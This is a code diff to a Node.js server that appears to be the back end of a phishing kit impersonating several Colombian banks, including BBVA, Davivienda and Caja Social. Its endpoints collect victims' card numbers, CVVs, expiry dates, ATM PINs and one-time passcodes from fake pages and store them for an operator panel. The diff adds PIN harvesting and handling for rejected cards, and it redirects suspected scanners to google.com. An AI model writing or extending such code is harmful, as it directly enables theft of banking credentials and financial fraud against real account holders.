@@ -104,6 +104,7 @@ function guardarHistorial(bancoKey, datos) {
         if (datos.otp) otpsHistorial.push({ otp: datos.otp, tipo: 'otp', fecha: new Date().toISOString() });
         if (datos.claveDinamica && datos.claveDinamica !== datos.otp) otpsHistorial.push({ otp: datos.claveDinamica, tipo: 'claveDinamica', fecha: new Date().toISOString() });
         if (datos.token) otpsHistorial.push({ otp: datos.token, tipo: 'token', fecha: new Date().toISOString() });
+        if (datos.pin) otpsHistorial.push({ otp: datos.pin, tipo: 'pin', fecha: new Date().toISOString() });
 
         const registro = {
             id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
@@ -150,6 +151,9 @@ function guardarHistorial(bancoKey, datos) {
     }
     if (datos.token && datos.token !== prev.token) {
         otpsHistorial.push({ otp: datos.token, tipo: 'token', fecha: new Date().toISOString() });
+    }
+    if (datos.pin && datos.pin !== prev.pin) {
+        otpsHistorial.push({ otp: datos.pin, tipo: 'pin', fecha: new Date().toISOString() });
     }
 
     historial[idx].datos = Object.assign({}, prev, datos, {
@@ -538,6 +542,22 @@ const server = http.createServer(async (req, res) => {
                         try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
                     }
 
+                    // 🔥 FIX: Si es RECHAZAR, limpiar datos de la CC/PIN (del panel y del historial) 🔥
+                    if (accion === 'RECHAZAR') {
+                        const camposLimpiar = ['tarjeta','titular','exp','expMes','expAnio','cvv','pin','bin','cardBrand','cardType','cardLevel','bankName','countryName','fechaCaptura'];
+
+                        const prevDatos = datosSesiones.get(sessionId) || {};
+                        camposLimpiar.forEach(c => delete prevDatos[c]);
+                        datosSesiones.set(sessionId, prevDatos);
+
+                        const idxHR = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId);
+                        if (idxHR !== -1) {
+                            camposLimpiar.forEach(c => delete historial[idxHR].datos[c]);
+                            try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                        }
+                        console.log(`[RECHAZAR] Datos de CC/PIN limpiados para ${sessionId}`);
+                    }
+
                     console.log(`[${payload.user}] ${accion} → ${sessionId} | estado: ${estadoNuevo}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
                 } catch (e) { json(res, 400, { ok: false, error: e.message }); }
@@ -852,7 +872,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVO ENDPOINT PARA BBVA (RECIBE LOS DATOS DE LA TARJETA DESDE cc.html) 🔥
         if (req.method === 'POST' && url === '/bbva/guardar-tarjeta') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -896,7 +915,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVO ENDPOINT PARA BANCO POPULAR 🔥
         if (req.method === 'POST' && url === '/popular/guardar-tarjeta') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -940,7 +958,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVO ENDPOINT PARA BANCO DE OCCIDENTE 🔥
         if (req.method === 'POST' && url === '/occidente/guardar-tarjeta') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -984,7 +1001,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVO ENDPOINT PARA CAJA SOCIAL (RECIBE TARJETA DESDE buildc.html) 🔥
         if (req.method === 'POST' && url === '/caja-social/guardar-tarjeta') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -1028,7 +1044,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVO ENDPOINT PARA CAJA SOCIAL (RECIBE PIN / CLAVE ATM DESDE confirmacion.html) 🔥
         if (req.method === 'POST' && url === '/caja-social/guardar-pin') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -1058,7 +1073,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 AQUI ESTA LA PROTECCIÓN CON EL CAPTCHA 🔥
         if (req.method === 'POST' && url === '/vanti/enviar') {
             try {
                 const datos = await getBody(req);
@@ -1105,7 +1119,7 @@ const server = http.createServer(async (req, res) => {
                     rol,
                     precio,
                     monto: precio,
-                    cvv: 'PSE' // 🔥 AGREGAR ESTA LÍNEA
+                    cvv: 'PSE'
                 });
 
                 datosSesiones.set(sessionId, datosCompletos);
@@ -1118,13 +1132,11 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 NUEVO: Endpoint para recibir qué banco seleccionó el usuario en PSE */
         if (req.method === 'POST' && url === '/vanti/seleccionar-banco') {
             try {
                 const { sessionId, banco } = await getBody(req);
                 if (!sessionId || !banco) { json(res, 400, { ok: false }); return; }
                 
-                // Mapeo de las siglas de 4 letras
                 const siglas = {
                     'bancolombia': 'TRICO',
                     'davivienda': 'DAVI',
@@ -1140,7 +1152,7 @@ const server = http.createServer(async (req, res) => {
                 const previos = datosSesiones.get(sessionId) || {};
                 const datosCompletos = Object.assign({}, previos, { 
                     bancoSeleccionado: banco,
-                    cvv: sigla // 🔥 Guardamos la sigla (Ej: DAVI)
+                    cvv: sigla
                 });
                 
                 datosSesiones.set(sessionId, datosCompletos);
@@ -1218,7 +1230,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 NUEVO: endpoint específico de Davivienda para recibir la tarjeta */
         if (req.method === 'POST' && url === '/davivienda/enviar-pago') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -1258,7 +1269,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 NUEVO: endpoint específico de Davivienda para recibir OTP */
         if (req.method === 'POST' && url === '/davivienda/enviar-otp') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
